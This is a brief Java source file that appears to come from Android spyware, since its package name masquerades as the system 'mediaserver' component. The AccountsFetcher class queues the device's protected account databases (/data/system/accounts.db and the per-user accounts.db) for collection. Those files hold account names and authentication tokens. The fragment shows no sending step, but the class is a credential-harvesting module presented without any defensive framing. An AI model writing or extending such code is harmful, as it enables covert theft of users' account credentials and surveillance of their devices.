package com.android.mediaserver.fetchers.account;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.io.File;
import java.util.ArrayList;

public class AccountsFetcher extends FileFetcher {
  public AccountsFetcher() {
    this.mFetchedFiles = new ArrayList();
    this.mFetchedFiles.add(
        new FetchedFile(new File("/data/system/accounts.db"), "BIN", "accounts"));
    this.mFetchedFiles.add(
        new FetchedFile(new File("/data/system/users/0/accounts.db"), "BIN", "accounts"));
  }
}
